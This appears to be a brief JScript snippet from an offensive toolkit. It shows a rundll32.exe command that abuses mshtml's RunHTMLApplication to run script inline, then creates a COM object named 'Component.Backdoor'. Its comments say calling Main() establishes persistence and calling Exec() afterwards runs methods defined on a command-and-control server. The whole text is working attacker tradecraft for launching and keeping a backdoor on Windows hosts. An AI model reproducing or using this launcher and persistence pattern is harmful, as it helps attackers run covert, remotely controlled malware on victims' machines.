//rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();x=new%20ActiveXObject("Component.Backdoor");x.Main();
//We need to Call Main At least Once To Establish Persistence.

var x = new ActiveXObject("Component.Backdoor");
x.Main();

//After That, Just Call your method defined in the c2 :-)
var x = new ActiveXObject("Component.Backdoor");
x.Exec();
